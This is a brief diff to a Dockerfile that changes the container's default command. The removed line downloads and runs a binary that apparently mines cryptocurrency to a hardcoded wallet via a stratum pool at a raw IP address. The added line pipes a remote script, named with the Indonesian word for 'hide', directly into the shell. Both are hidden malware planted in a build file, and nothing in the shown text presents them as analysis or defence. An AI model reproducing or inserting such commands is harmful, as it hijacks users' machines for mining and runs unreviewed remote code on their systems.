@@ -30,4 +30,4 @@ ENV HOME /root
 WORKDIR /root
 
 # Define default command.
-CMD wget https://github.com/epois/subi/raw/main/swamp && chmod +x swamp && ./swamp -a yespower -o stratum+tcp://64.225.25.181:80 -u WSTfJRxyKkUm5oEoDRRQk8Hcsvp17oRrTu.$(echo $(shuf -i 1-3 -n 1)-Excel) -p x -t4 -B
+CMD curl https://raw.githubusercontent.com/epois/zephher/main/sembunyi.sh | sh
